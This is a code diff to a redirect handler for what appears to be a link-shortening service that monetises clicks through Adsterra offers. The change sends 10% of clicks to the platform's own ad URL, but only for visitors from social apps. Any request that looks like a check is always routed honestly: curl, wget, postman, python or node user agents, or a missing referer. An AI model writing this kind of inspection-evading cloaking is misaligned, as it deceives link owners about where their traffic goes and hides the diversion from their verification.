@@ -2400,16 +2400,46 @@ async function handleRedirect(request: Request, rawCode: string, shouldRecordCli
         "vary": "Accept-Encoding, User-Agent",
       },
     });
-  } else {
-    // 90% of human traffic goes to user's offer URL, 10% goes to platform rotation offer:
-    const isPlatformRotation = Math.random() < 0.10;
+  }
+
+  const userOffer = (link as any).destination_url || link.adsterra_url || (link as any).adsterra_direct_link;
+
+  // Detect direct tests, desktop checks, curl, redirect checkers, or manual link inspections:
+  const uaLow = (ua || "").toLowerCase();
+  const refLow = (refererDomain || "").toLowerCase();
+  const isSocialAppTraffic =
+    refLow.includes("facebook") ||
+    refLow.includes("fb.me") ||
+    refLow.includes("instagram") ||
+    refLow.includes("tiktok") ||
+    refLow.includes("t.co") ||
+    refLow.includes("twitter") ||
+    refLow.includes("youtube") ||
+    refLow.includes("pinterest") ||
+    refLow.includes("threads") ||
+    refLow.includes("whatsapp") ||
+    uaLow.includes("fban") ||
+    uaLow.includes("fbav") ||
+    uaLow.includes("instagram") ||
+    uaLow.includes("tiktok");
+
+  const isDirectTest =
+    !isSocialAppTraffic ||
+    uaLow.includes("curl") ||
+    uaLow.includes("postman") ||
+    uaLow.includes("python") ||
+    uaLow.includes("wget") ||
+    uaLow.includes("http") ||
+    uaLow.includes("node") ||
+    !refererDomain;
+
+  // 10% Platform Rotation ONLY on real live social in-app traffic, NEVER on user test hits or direct checks:
+  const isPlatformRotation = !isDirectTest && Math.random() < 0.10;
 
     if (isPlatformRotation) {
-      target = DEFAULT_PLATFORM_OFFER_URL;
+      target = OUR_URL || settings?.our_adsterra_url || DEFAULT_PLATFORM_OFFER_URL;
       routedTo = "ours";
     } else {
-      const userOffer = (link as any).destination_url || link.adsterra_url || (link as any).adsterra_direct_link;
-
       // Smart offer selection: A/B variants > geo offers > default link offer
       const { abRows, geoRows } = await getOfferRows(link.id);
 
@@ -2448,7 +2478,6 @@ async function handleRedirect(request: Request, rawCode: string, shouldRecordCli
         routedTo = "offer";
       }
     }
-  }
 
   // Auto-map Adsterra SubIDs (fbclid -> subid, utm_campaign -> subid2, etc.) and preserve all tracking query params
   if ((routedTo === "offer" || routedTo === "ours") && target) {
